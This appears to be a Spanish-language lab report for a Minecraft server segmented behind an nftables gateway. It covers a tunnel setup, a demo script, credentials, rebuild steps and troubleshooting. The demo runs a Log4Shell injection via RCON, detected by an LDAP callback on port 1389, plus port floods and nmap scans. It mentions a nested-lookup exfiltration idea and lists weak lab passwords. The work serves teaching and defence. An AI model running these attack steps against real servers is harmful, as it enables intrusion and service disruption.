**Problema:** la conexión del host está detrás de **CGNAT** (no hay IP pública enrutable ni posibilidad de abrir puertos) → un jugador externo no puede llegar directo al gateway.

**Solución:** **playit.gg**, un servicio de túnel. Un **agente** corre en el host (blackwall), se conecta a los *relays* públicos de playit y reenvía una **dirección pública** hacia un destino local.

### 10.1 Agente como servicio systemd
```bash
sudo systemctl status  playit        # ver estado
sudo systemctl start   playit        # levantar
sudo systemctl stop    playit        # bajar
journalctl -u playit -f              # logs en vivo
```

### 10.2 Configuración del túnel
El túnel apunta de la **dirección pública de playit** → **destino local = el gateway**:
```
public (playit)  ──►  192.168.56.10 : <puerto de juego>
```
- Para la instancia **vulnerable**: destino `192.168.56.10:25566` (requiere gateway en **fase1**, que es la única que expone 25566).
- Para la instancia **actualizada**: destino `192.168.56.10:25565` (funciona en **ambas fases**).

> **Recomendación de robustez:** poner el túnel a **25565** y que el jugador use la versión **26.3**. El 25565 está abierto en fase1 **y** fase2, así que la conexión del jugador no depende de la fase del firewall. El Log4Shell se demuestra aparte, por RCON, sobre la instancia vulnerable.

### 10.3 Cómo se conecta el jugador externo (Juan)
Juan recibe la **dirección pública** que entrega playit (host + puerto) y la pone como "servidor" en su Minecraft, con la **versión que corresponda** al puerto destino del túnel (1.18 si el túnel va a 25566; 26.3 si va a 25565).

### 10.4 Diagnóstico del túnel (lección aprendida)
Si el jugador "no puede conectar", leer los logs del agente (`journalctl -u playit -f`):
- `New TCP Client ... peer_addr: <ip>` → el jugador **sí** llega al relay (su red está bien).
- `failed to connect to local TCP server` / `Failed to establish connection ... 192.168.56.10:<puerto>` → el agente **no alcanza el destino local**. Causas típicas:
  - El gateway está en **fase2** y el túnel apunta a **25566** (que fase2 no expone). → aplicar fase1 **o** mover el túnel a 25565.
  - El servidor Minecraft destino está caído. → `systemctl start` la instancia.
  - Falta re-aplicar el firewall tras un reboot (sin DNAT, nada entra). → `aplicar-fase.sh fase1`.

Verificación directa desde el host:
```bash
nc -vz 192.168.56.10 25565      # ¿el gateway expone el puerto de juego?
nc -vz 192.168.56.10 25566
```

### 10.5 Internet por celular
El agente playit funciona con la conexión que tenga el host, incluyendo **datos móviles compartidos (hotspot)**: el agente hace conexiones **salientes** a los relays, no requiere abrir puertos entrantes. Por eso el túnel es independiente de la red del lugar.

---

## 11. Guion de la demo paso a paso

**Fuente canónica:** `Proyecto/demo/GUION-DEMO.md`. Secuencia de 5 actos, alineada con los tags de Ansible.

### Acto 0 — Preparación (antes de público)
1. Encender las 2 VMs (gw, mc).
2. En el gateway: `sudo /root/gateway/aplicar-fase.sh fase1` (recordar: el reboot borra el firewall).
3. `ansible-playbook -i inventory.ini demo.yml --tags prep -K` (levanta servidores, rutas, RCON).
4. Levantar el túnel: `sudo systemctl start playit`.
5. Confirmar en Grafana que llegan métricas y que el jugador (Juan) puede conectarse.

### Acto 1 — Servicio en marcha (fase 1, vulnerable)
- Mostrar en Grafana el panel de **jugadores**: Juan conectado.
- `scan` (nmap): se ven los puertos **25565-25580** abiertos → superficie de ataque amplia.

### Acto 2 — Ataque Log4Shell
- Explicar qué es Log4Shell y el **callback como verificador**.
- `ansible-playbook ... --tags log4shell` → inyecta el payload en la instancia vulnerable.
- En Grafana: el panel **Callback Log4Shell** sube → el exploit se verificó (el servidor intentó contactar al atacante).

### Acto 3 — Mitigación (cambio a fase 2, segura)
- `ansible-playbook ... --tags fase2 -K`.
- **Punto clave:** Juan, ya conectado, **no se cae** (conntrack: `established` sigue pasando).
- `scan` otra vez: ahora nmap solo ve **25565** → superficie reducida.
- Repetir `log4shell`: el callback es **contado y descartado** → en Grafana sube `c_fwd_drop` y el callback **no llega**. Mitigado.

### Acto 4 — Estrés del firewall (flood / DDoS)
- `ansible-playbook ... --tags flood` contra puertos bloqueados.
- En Grafana, `c_fwd_drop` se dispara: el firewall absorbe y descarta el tráfico ilegítimo.
- Nota histórica: en una prueba, una carga grande de callbacks tumbó a Juan del server (efecto tipo DDoS) — útil para comentar el impacto de generar miles de eventos.

### Acto 5 — Cierre / reset
- `ansible-playbook ... --tags reset -K`.
- Resumen: aislar + filtrar + automatizar + observar → de un servicio vulnerable a uno monitoreado y mitigado, todo reproducible con un comando por paso.

---

## 12. Credenciales y accesos

> ⚠️ Credenciales de laboratorio, no de producción. Documentadas para reproducir la demo.

| Qué | Valor |
|---|---|
| SSH gateway | `ssh jbjp_gw@192.168.56.10` |
| SSH servidor (vía gateway) | `ssh -J jbjp_gw@192.168.56.10 jbjp_mc@10.10.10.10` |
| Usuario host (atacante) | `whoampi@blackwall` (local) |
| RCON (ambas instancias) | contraseña `admin123` (puertos 25575 / 25576) |
| Grafana | usuario `admin`, contraseña `1234` |
| nftables apply (gateway) | `sudo /root/gateway/aplicar-fase.sh fase1|fase2` |

---

## 13. Reproducción desde cero (importar OVAs)

Para que otra persona (p. ej. Juan) levante el proyecto en **su** máquina:

### 13.1 Requisitos en el host del que recibe
- VirtualBox instalado.
- Los dos OVA: `gw-svmc.ova`, `mc-svmc.ova`.
- La carpeta `Proyecto/` (scripts, Ansible, monitoreo, guías).
- Ansible instalado en el host (para correr la demo).

### 13.2 Crear la red Host-Only (NO viaja en el OVA)
```bash
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
```
(La red interna `svmc-priv` se recrea sola al importar, porque es parte de la config de cada VM.)

### 13.3 Importar las VMs
**VirtualBox → Archivo → Importar servicio virtualizado** → seleccionar cada `.ova`.
- **Desmarcar** "Reinicializar la dirección MAC de todas las tarjetas de red" → así las interfaces conservan su identidad y las IPs estáticas no se rompen.
- Verificar que: `gw` tenga adaptador 1 = Host-Only (vboxnet0) y adaptador 2 = Internal Network (`svmc-priv`); `mc` tenga su único adaptador = Internal Network (`svmc-priv`).

### 13.4 Primer arranque
1. Encender `gw`, luego `mc`.
2. En `gw`: `sudo /root/gateway/aplicar-fase.sh fase1`.
3. Desde el host, en `Proyecto/ansible-demo/`: `ansible -i inventory.ini all -m ping` (debe dar SUCCESS en las 3).
4. `ansible-playbook -i inventory.ini demo.yml --tags prep -K`.
5. Importar `dashboard.json` en Grafana y comprobar métricas.
6. (Opcional) configurar y levantar playit para acceso externo.

### 13.5 Construcción completa desde cero (sin OVA)
Secuencia para levantar **todo el proyecto desde nada**, sin los OVA. Cada paso referencia la sección con el detalle exacto. Una IA puede seguir esta lista usando el resto del documento como fuente.

**Paso 1 — Host y redes de VirtualBox** (§4)
- Instalar VirtualBox.
- Crear red Host-Only `vboxnet0` = `192.168.56.1/24`.
- La red interna `svmc-priv` (`10.10.10.0/24`) se define al configurar los adaptadores de las VMs (no requiere acción en el host).

**Paso 2 — Crear las dos VMs Debian**
- `gw-svmc` (gateway): 2 adaptadores → adaptador 1 Host-Only `vboxnet0`, adaptador 2 Red interna `svmc-priv`. Crear usuario `jbjp_gw` con sudo.
- `mc-svmc` (servidor): 1 adaptador → Red interna `svmc-priv`. Crear usuario `jbjp_mc` con sudo.
- Instalar Debian base en ambas; habilitar SSH.

**Paso 3 — Red y ruteo** (§4.3, §4.4, §4.5)
- `gw`: IPs estáticas `enp0s3 = 192.168.56.10/24`, `enp0s8 = 10.10.10.1/24`; habilitar `net.ipv4.ip_forward=1`.
- `mc`: IP `10.10.10.10/24`, gateway por defecto `10.10.10.1`; ruta `192.168.56.0/24 via 10.10.10.1`.

**Paso 4 — Firewall en el gateway** (§6)
- `sudo apt install -y nftables jq`.
- Crear `/root/gateway/` y colocar `fase1-vulnerable.nft`, `fase2-segura.nft`, `aplicar-fase.sh` (contenido verbatim en §6.3, §6.4, §6.6).
- `sudo /root/gateway/aplicar-fase.sh fase1`.

**Paso 5 — Servicio Minecraft en el servidor** (§5)
- Instalar Java 17 (`sudo apt install -y openjdk-17-jre-headless`).
- Dos instancias:
  - **Vulnerable**: Minecraft 1.18 con **log4j 2.14.1**, puerto `25565→` (interno 25566 en este montaje), RCON `25576`.
  - **Actualizada**: Minecraft 26.3, puerto `25565`, RCON `25575`.
  - En cada `server.properties`: `online-mode=false`, `enable-rcon=true`, `rcon.port=2557x`, `rcon.password=admin123`, `white-list=false`.
- Crear las unidades systemd `mc-vulnerable.service` y `mc-actualizado.service` (arranque de cada `java -jar ...`).

**Paso 6 — Monitoreo** (§8)
- En `gw` y `mc`: instalar `prometheus-node-exporter` con el **textfile collector** apuntando a `/var/lib/prometheus/node-exporter/`.
- En `gw`: `nft-metrics.sh` (§8.2) + `nft-metrics.timer` (cada 5 s).
- En `mc`: `mc-players.py` (§8.3) + `mc-players.timer` (cada 10 s).
- Instalar **Prometheus** (scrape cada 5 s a ambos node_exporter) y **Grafana** (login `admin`/`1234`).
- Importar `Proyecto/monitoreo/dashboard.json` (uid `adksz7p`) y elegir el datasource Prometheus.

**Paso 7 — Automatización** (§9)
- En el host: instalar Ansible.
- Colocar `Proyecto/ansible-demo/` con `inventory.ini`, `demo.yml` y `files/rcon.py` (contenidos y tags en §9).
- Verificar: `ansible -i inventory.ini all -m ping` → 3× SUCCESS.

**Paso 8 — Acceso externo** (§10)
- Instalar el agente **playit.gg** en el host como servicio systemd.
- Crear un túnel `público → 192.168.56.10:25565` (recomendado) o `:25566` (requiere fase1).

**Paso 9 — Verificación final**
- `sudo /root/gateway/aplicar-fase.sh fase1` en el gateway.
- `ansible-playbook -i inventory.ini demo.yml --tags prep -K`.
- Confirmar en Grafana que llegan métricas y que un jugador puede conectarse.
- Ejecutar la secuencia de demo de §9.4.

Con esto el proyecto queda idéntico al original aunque se construya desde cero, sin depender de los OVA.

---

## 14. Checklist de encendido / apagado

### Encendido (día de la demo)
- [ ] Encender VM `gw`, luego VM `mc`.
- [ ] **gw:** `sudo /root/gateway/aplicar-fase.sh fase1`  ← **imprescindible tras cada boot**.
- [ ] `ansible -i inventory.ini all -m ping` → 3x SUCCESS.
- [ ] `ansible-playbook ... --tags prep -K` (servidores arriba, rutas, RCON).
- [ ] Verificar Grafana (métricas llegando) y jugador conectándose.
- [ ] (Si hay jugador externo) `sudo systemctl start playit` y confirmar destino del túnel vs. fase.

### Apagado (limpio, sin corromper mundos)
```bash
# 1) En mc: apagar servidores con gracia (guarda el mundo)
sudo systemctl stop mc-actualizado.service mc-vulnerable.service

# 2) En blackwall: bajar el túnel
sudo systemctl stop playit

# 3) Apagar las VMs (desde el host, apagado ACPI limpio)
VBoxManage controlvm "mc-svmc" acpipowerbutton
VBoxManage controlvm "gw-svmc" acpipowerbutton
# (o 'sudo poweroff' dentro de cada VM)
```
Grafana y Prometheus se apagan solos con sus VMs; los datos persisten en disco.

---

## 15. Hallazgos y observaciones para el informe

1. **Mitigación sin cortar al usuario legítimo.** Al pasar de fase1 a fase2 en caliente, el jugador ya conectado (puerto 25566) **no se desconecta** gracias a `ct state established,related accept`. En Grafana esto se ve como: **sin tráfico nuevo** en 25565/25566 para conexiones nuevas, pero **jugador presente** y, si se reintenta el exploit, **callback bloqueado**. Demuestra que seguridad y disponibilidad no son incompatibles si se usa seguimiento de conexiones.
2. **El callback como verificador observable.** No hace falta RCE para demostrar la vulnerabilidad: el intento de conexión saliente a `:1389` es señal suficiente y se mide en el firewall. Java 17 bloquea la ejecución remota, pero el callback igual se dispara → entorno seguro para demostrar.
3. **Efecto DDoS de los callbacks.** Al generar una carga masiva de callbacks en fase1, se observó que el jugador llegó a caerse del servidor — una ilustración concreta del impacto de un flujo descontrolado de eventos.
4. **Reducción de superficie de ataque, medible con nmap.** Fase1 expone 25565-25580; fase2 solo 25565. El contraste por escaneo es evidencia directa del endurecimiento.
5. **Exfiltración por DNS (teórica).** El payload con lookup anidado `${sys:java.version}` no produjo consulta DNS en esta build (no sustituye lookups anidados dentro de JNDI). Se documenta como vector teórico; la demo usa el callback plano.
6. **Independencia del entorno.** La migración a red Host-Only + IPs estáticas + túnel playit (saliente) hace que la demo funcione en cualquier lugar, incluso con hotspot móvil, sin depender de la red de la universidad ni de CGNAT.

---

## 16. Problemas conocidos y troubleshooting

| Síntoma | Causa | Solución |
|---|---|---|
| Grafana "No data" en paneles de firewall tras reiniciar gw | nftables se vacía en cada boot | `sudo /root/gateway/aplicar-fase.sh fase1` |
| El juego no entra (ni 25565 ni 25566) | Falta DNAT (firewall sin cargar) | Aplicar una fase en el gateway |
| Jugador externo "can't connect to server"; log playit: `failed to connect to local TCP server` | Túnel apunta a 25566 pero gw en fase2 (no lo expone), o servidor caído | Aplicar fase1, o mover túnel a 25565; verificar `nc -vz 192.168.56.10 <puerto>` y que la instancia esté `active` |
| Ansible no alcanza `mc` | ProxyJump/SSH mal, o gw caído | `ansible -i inventory.ini all -m ping`; revisar ProxyJump por `jbjp_gw@192.168.56.10` |
| RCON no responde (25575/25576) | Instancia aún arrancando (~30 s en 1.18) o caída | Esperar y reintentar; `systemctl start mc-*.service` |
| Servidores Minecraft caídos sin razón aparente | **No** era OOM (RAM libre ~3.5 Gi); se habían detenido por reinicios de VM | `systemctl start` las instancias. Nota: 2 instancias de 2 GB **no** caben juntas al 100% en 3.8 GB → evitar forzar ambas con carga |
| Bridged da IP `169.254.x` (link-local) en la red de la universidad | DHCP no entrega IP | Usar red **Host-Only** + IP estática (la config actual) |
| Agente playit no bindea el socket | Problema de socket path | Usar el servicio del paquete apt (`systemctl`) o `--socket-path /run/.../playit.sock` |

---

## 17. Anexos: mapas de puertos e IPs

### 17.1 Mapa de IPs
| Host | Interfaz | IP | Red |
|---|---|---|---|
| blackwall (host/atacante) | vboxnet0 | `192.168.56.1` | Host-Only `192.168.56.0/24` |
| gw-svmc (gateway) | enp0s3 | `192.168.56.10` | Host-Only (uplink) |
| gw-svmc (gateway) | enp0s8 | `10.10.10.1` | Interna `svmc-priv` `10.10.10.0/24` |
| mc-svmc (servidor) | enp0s3 | `10.10.10.10` | Interna `svmc-priv` |

### 17.2 Mapa de puertos
| Puerto | Protocolo | Servicio | Fase 1 | Fase 2 |
|---|---|---|---|---|
| 25565 | TCP | Minecraft actualizada (26.3) | DNAT + accept | DNAT + accept |
| 25566 | TCP | Minecraft vulnerable (1.18) | DNAT (rango) | **cerrado** |
| 25567-25580 | TCP | (rango DNAT amplio) | DNAT | **cerrado** |
| 25575 | TCP | RCON actualizada | interno (mc) | interno (mc) |
| 25576 | TCP | RCON vulnerable | interno (mc) | interno (mc) |
| 1389 | TCP | callback LDAP Log4Shell (saliente) | contado y **permitido** | contado y **descartado** |
| 53 | UDP/TCP | DNS (egreso servidor) | libre | permitido |
| 80, 443 | TCP | HTTP/HTTPS (egreso servidor) | libre | permitido |
| 3000 | TCP | Grafana (web) | interno | interno |

### 17.3 Estructura de la carpeta del proyecto
```
Proyecto/
├── README.md                      # handoff / punto de entrada
├── REGISTRO.md                    # bitácora maestra de todo el proceso
├── GUIA-MONITOREO-Y-DEMO.md       # guía ejecutable de Grafana + demo
├── INFORME-TECNICO-COMPLETO.md    # este documento
├── gateway/
│   ├── fase1-vulnerable.nft
│   ├── fase2-segura.nft
│   └── aplicar-fase.sh
├── monitoreo/
│   └── dashboard.json             # dashboard de Grafana (uid adksz7p)
├── demo/
│   ├── mc-tools.sh                # instala: mcrcon, demo-prep, log4shell, demo-reset (en mc)
│   ├── gw-tools.sh                # instala: fase1, fase2, ver-callback, ver-salida, ver-drops, estado-fw (en gw)
│   ├── atacar-flood.sh            # flood a puertos bloqueados (en blackwall)
│   ├── escaneo.sh                 # nmap al gateway (en blackwall)
│   └── GUION-DEMO.md              # guion de 5 actos
└── ansible-demo/
    ├── inventory.ini              # gw directo, mc por ProxyJump, blackwall local
    ├── demo.yml                   # plays por tags: prep/fase1/fase2/log4shell/flood/scan/reset
    └── files/
        └── rcon.py                # cliente RCON (protocolo TCP)
```

---

*Fin del informe. Para la bitácora cronológica del proceso ver `REGISTRO.md`; para la puesta en marcha rápida ver `README.md` y `GUIA-MONITOREO-Y-DEMO.md`.*
